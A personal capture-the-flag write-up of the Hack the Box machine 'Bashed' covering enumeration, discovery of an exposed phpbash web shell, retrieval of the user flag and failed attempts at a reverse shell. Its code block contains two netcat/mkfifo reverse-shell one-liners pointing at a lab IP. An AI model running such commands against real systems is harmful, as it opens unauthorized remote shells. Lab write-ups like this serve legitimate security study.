# Website

This website seems to be a promotional page for a replica bash shell written in PHP.

![[Pasted image 20210505083541.png]]

The links all point back to `index.html`

![[Pasted image 20210505085925.png]]

I also checked the source, but there were no hidden links and the form submission didn't go anywhere. It did mention PHP:

![[Pasted image 20210505090749.png]]

As the source and the site itself both mention php, I quickly checked if the `.php` extension was valid:

![[Pasted image 20210505085959.png]]

But it seemed the index page at least was running on pure HTML.

The blog post, dated in 2017, suggests that the web shell is available on the server, and even gives us a potential URL:

![[Pasted image 20210505090142.png]]

We can also see the source code at: [https://github.com/Arrexel/phpbash](https://github.com/Arrexel/phpbash). We'll come back to this if needed.

I tried the URL from the screenshot, but it was not found:

![[Pasted image 20210505090246.png]]

Neither was `/phpbash.php`.

## PHP Web Shell

I ran a [[Writeups/Hack the Box/Boxes/Bashed/5 - Enumeration#Gobuster|quick gobuster]] to check for potential directories for the script. It found `/php/` and `/dev/`. I tried `/php/phpbash.php`, and then `/dev/phpbash.php`, which worked:

![[Pasted image 20210505090543.png]]

I did some very quick enumeration, looking for users and quickly finding that `arrexel`'s home directory was world-readable. This gives us the user flag:

![[Pasted image 20210505091030.png]]

## Trying to Get a Reverse Shell

Before I enumerated more for priv esc, I wanted a better shell. I tried a few commands, to no avail:

![[Pasted image 20210505093721.png]]

I googled "netcat openbsd reverse shell" and tried the following commands:

```bash
www-data@bashed:/var/www/html/dev# rm /tmp/f;mkfifo /tmp/f; cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.13 9001 >/tmp/f

www-data@bashed:/var/www/html/dev# rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.13 9001 >/tmp/f
```

But I got no result.

I also tried the `upload` custom command mentioned in the source code, to no avail.

![[Pasted image 20210505101232.png]]

I decided to continue with enumeration and come back to this once I'd rooted the box and see if anyone had done it in a writeup. I would eventually upgrade my shell [[15 - Privesc]]